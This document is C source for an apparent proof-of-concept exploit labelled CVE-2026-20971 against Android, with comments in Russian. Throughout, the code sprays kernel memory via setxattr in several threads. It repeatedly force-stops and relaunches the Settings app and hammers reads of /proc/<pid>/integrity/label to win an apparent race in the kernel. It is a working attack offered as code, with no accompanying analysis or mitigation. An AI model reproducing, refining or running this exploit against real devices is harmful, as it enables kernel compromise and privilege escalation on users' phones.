#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <signal.h>
#include <dirent.h>
#include <sys/xattr.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <stdbool.h>

int find_pid(const char *name) {
    DIR *dir = opendir("/proc");
    struct dirent *entry;
    int pid = -1;
    if (!dir) return -1;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            int id = atoi(entry->d_name);
            if (id > 0) {
                char path[256], cmdline[128];
                snprintf(path, sizeof(path), "/proc/%d/cmdline", id);
                int fd = open(path, O_RDONLY);
                if (fd >= 0) {
                    int n = read(fd, cmdline, sizeof(cmdline)-1);
                    close(fd);
                    if (n > 0) {
                        cmdline[n] = '\0';
                        if (strstr(cmdline, name) != NULL) {
                            pid = id;
                            break;
                        }
                    }
                }
            }
        }
    }
    closedir(dir);
    return pid;
}

void* spray_thread(void* arg) {
    char value[56]; 
    memset(value, 0xFF, sizeof(value)); 
    char path[64];
    snprintf(path, sizeof(path), "/data/local/tmp/spray_%d", gettid());
    int fd = open(path, O_CREAT | O_RDWR, 0600);
    if (fd >= 0) close(fd);
    long count = 0;
    while(1) {
        char name[64];
        snprintf(name, sizeof(name), "user.spray_%ld", count++);
        setxattr(path, name, value, sizeof(value), 0);
        // Даем системе подышать, чтобы не задушить VFS
        if (count % 100 == 0) usleep(100); 
    }
    return NULL;
}

void run_am_cmd(const char *arg1, const char *arg2, const char *arg3) {
    pid_t pid = fork();
    if (pid == 0) {
        execl("/system/bin/am", "am", arg1, arg2, arg3, NULL);
        _exit(1);
    }
}

void* trigger_thread(void* arg) {
    while(1) {
        run_am_cmd("force-stop", "com.android.settings", NULL);
        usleep(1000000); // 1 СЕКУНДА
        run_am_cmd("start", "-n", "com.android.settings/.Settings");
        usleep(1000000); // 1 СЕКУНДА
    }
    return NULL;
}

void* reader_thread(void* arg) {
    char buf[256];
    long iter = 0;
    int last_pid = -1;

    while(1) {
        int current_pid = find_pid("app_process64");
        if (current_pid == -1) current_pid = find_pid("com.android.settings");
        
        if (current_pid != -1 && current_pid != last_pid) {
            last_pid = current_pid;
            printf("[+] Caught PID: %d. Spamming...\n", last_pid);
            
            char path[64];
            snprintf(path, sizeof(path), "/proc/%d/integrity/label", last_pid);

            while(1) {
                int fd = open(path, O_RDONLY);
                if (fd < 0) break; 
                
                read(fd, buf, sizeof(buf)); 
                close(fd);
                
                iter++;
                if (iter % 10000 == 0) {
                    printf("[Reader] Iter: %ld\n", iter);
                    sched_yield(); 
                }
            }
            printf("[-] PID %d died.\n", last_pid);
            last_pid = -1; 
        }
        usleep(5000); // Увеличили паузу поиска PID
    }
    return NULL;
}

int main() {
    setbuf(stdout, NULL);
    printf("[*] CVE-2026-20971 PoC v22 (Low Load)\n");

    // 4 потока спрея
    for (int i=0; i<4; i++) {
        pthread_t tid;
        pthread_create(&tid, NULL, spray_thread, NULL);
        pthread_detach(tid);
    }

    // 1 поток триггера
    pthread_t trigger_tid;
    pthread_create(&trigger_tid, NULL, trigger_thread, NULL);
    pthread_detach(trigger_tid);

    // 2 потока чтения
    for (long i=0; i<2; i++) {
        pthread_t tid;
        pthread_create(&tid, NULL, reader_thread, (void*)i);
        pthread_detach(tid);
    }

    while(1) sleep(10);
    return 0;
}